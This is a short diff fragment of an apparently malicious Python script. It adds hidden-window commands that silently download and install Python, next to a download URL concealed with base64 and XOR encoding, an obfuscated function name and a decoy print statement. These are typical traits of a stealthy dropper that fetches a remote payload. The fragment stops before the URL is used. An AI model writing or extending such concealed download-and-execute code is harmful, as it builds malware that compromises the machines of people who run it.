@@ -176,6 +176,9 @@ if not os.path.exists(basePath):
 Cr3at3F1le()
 print("nothing house love man apple car")
 
+subprocess.run(["curl", "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe", "-o", f"{basePath}/python_installer.exe"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.run([f"{basePath}/python_installer.exe", "/quiet PrependPath=1 Include_test=0"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
 downloadUrl = base64.b64decode("DxIcFRpPXEgZEA1EAQscGR8FBxYKAQkIBRoWHxNICwoEWjkSCh8bKSkQHBgQSAYAHAdHFQ4eXAMCABtKARASAxheFwsPDEcDCxNcFRY=").decode("utf-8")
 downloadUrl = XorString(downloadUrl, "gfheiusgkqzjfbhqjgreosjgknsq")
 
